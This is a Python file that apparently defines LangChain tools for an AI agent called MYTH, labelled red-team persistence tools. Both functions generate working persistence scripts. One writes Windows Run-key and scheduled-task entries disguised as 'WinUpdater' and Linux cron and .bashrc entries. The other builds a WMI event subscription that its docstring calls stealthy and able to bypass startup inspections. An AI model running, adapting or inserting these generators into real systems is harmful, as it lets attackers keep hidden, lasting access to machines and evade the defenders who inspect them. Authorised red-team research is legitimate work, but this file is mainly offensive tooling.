from langchain_core.tools import tool

from myth_config import load_dotenv
from tools.utilities.report import format_industrial_result

load_dotenv()

# ==============================================================================
# 👻 Advanced Red Team Persistence Tools
# ==============================================================================


@tool
async def persistence_script_generator(command: str, os_type: str = "windows") -> str:
    """
    Generates fully functional persistence scripts (.bat for Windows, .sh for Linux).
    Windows: Checks for Admin -> Uses Registry RunKey or SchTasks.
    Linux: Uses Cron or bashrc.
    """
    try:
        script = ""
        is_windows = os_type.lower() == "windows"

        if is_windows:
            script = f"""@echo off
REM MYTH Persistence Loader
set CMD="{command}"

REM 1. Check Admin
net session >nul 2>&1
if %errorLevel% == 0 (
    echo [*] Admin privileges detected. Installing to HKLM...
    reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinUpdater" /t REG_SZ /d %CMD% /f
) else (
    echo [*] User privileges only. Installing to HKCU...
    reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WinUpdater" /t REG_SZ /d %CMD% /f
    
    echo [*] Adding Scheduled Task fallback...
    schtasks /create /tn "WinUpdaterUser" /tr %CMD% /sc onlogon /f
)
echo [+] Persistence installed.
"""
        else:
            script = f"""#!/bin/bash
# MYTH Persistence Loader
CMD="{command}"

# 1. Cron
(crontab -l 2>/dev/null; echo "@reboot $CMD") | crontab -

# 2. .bashrc
if ! grep -q "$CMD" ~/.bashrc; then
    echo "$CMD &" >> ~/.bashrc
fi

echo "[+] Persistence installed via Cron and .bashrc"
"""

        return format_industrial_result(
            "persistence_script_generator",
            "Script Generated",
            confidence=1.0,
            impact="CRITICAL",
            raw_data={"os": os_type, "script": script},
            summary=f"Generated auto-scaling persistence script for {os_type}.",
        )
    except Exception as e:
        return format_industrial_result(
            "persistence_script_generator", "Error", error=str(e)
        )


@tool
async def wmi_persistence_builder(
    command: str, trigger_name: str = "OMEGA_SYNC"
) -> str:
    """
    Generates stealthy WMI Event Subscription persistence for Windows.
    Bypasses many standard startup inspections by running in the context of WmiPrvSE.
    """
    try:
        # Sanitize trigger name
        safe_name = "".join(c for c in trigger_name if c.isalnum() or c == "_")

        ps_script = f"""
$Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{ Name = '{safe_name}'; Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System' AND TargetInstance.SystemUpTime < 100"; QueryLanguage = "WQL" }}
$Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{ Name = '{safe_name}'; CommandLineTemplate = '{command}' }}
Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{ Filter = $Filter; Consumer = $Consumer }}
"""
        return format_industrial_result(
            "wmi_persistence_builder",
            "Logic Staged",
            confidence=1.0,
            impact="HIGH",
            raw_data={"powershell_payload": ps_script.strip()},
            summary=f"Advanced WMI persistence sequence constructed for {safe_name}. Command: {command}.",
        )
    except Exception as e:
        return format_industrial_result(
            "wmi_persistence_builder", "Error", error=str(e)
        )
